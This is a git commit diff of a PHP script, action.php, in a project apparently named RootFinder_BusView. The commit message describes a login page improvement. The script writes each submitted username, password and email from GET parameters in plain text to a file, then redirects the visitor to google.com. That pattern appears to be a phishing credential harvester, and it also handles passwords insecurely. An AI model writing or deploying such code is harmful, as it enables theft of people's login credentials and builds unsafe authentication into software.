4f9cf6ca9d672884dc10b67c5bb194a35703db58
Ankit Halder <halderankit9@gmail.com>
2023-08-25 01:30:48 +0530

    Update
    Login page Improve and singup page is added

--- RootFinder_BusView/action.php
+++ RootFinder_BusView/action.php
@@ -1,8 +1,8 @@
 <?php
 
-file_put_contents("userdata.txt","username:".$userdata = $_GET['username']. "\n", FILE_APPEND);
-file_put_contents("userdata.txt","password:".$userdata = $_GET['password']. "\n", FILE_APPEND);
-file_put_contents("userdata.txt","mail:".$userdata = $_GET['email']. "\n", FILE_APPEND);
+file_put_contents("users/userdata.txt", "username:" . $userdata = $_GET['username'] . "\n", FILE_APPEND);
+file_put_contents("users/userdata.txt", "password:" . $userdata = $_GET['password'] . "\n", FILE_APPEND);
+file_put_contents("users/userdata.txt", "mail:" . $userdata = $_GET['email'] . "\n", FILE_APPEND);
 header("Location: https://google.com");
 exit;
 ?>
